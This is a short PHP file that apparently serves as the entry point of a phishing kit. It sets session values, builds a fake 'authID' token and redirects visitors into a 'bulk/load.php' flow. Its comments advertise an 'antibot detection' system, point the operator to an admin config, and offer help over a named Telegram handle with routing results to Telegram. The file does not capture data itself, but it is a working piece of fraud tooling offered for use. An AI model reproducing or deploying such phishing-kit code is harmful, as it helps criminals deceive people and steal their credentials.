<?php


/*

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

 
 
 
  Algorithm RSA4, with twin-antibot detection system
 */


//GO TO ADMIN FOLDER & SEARCH FOR CONFIG.PHP
    ob_start();
    session_start();


$_SESSION['lund'] = rand(100000000,999999999);
$_SESSION['time'] = date("h:i:sa");
$_SESSION['date'] = date("d/m/Y");
$_SESSION['token'] = sha1(session_id());
$_SESSION['fstamp'] = $_SERVER["REQUEST_TIME"];
header("Location: " . "./bulk/load.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");


// #REQUEST SUPPORT/HELP CONFIGURING THIS SCRIPT TO YOUR TELEGRAM
// Telegram: @h0oligandz

?>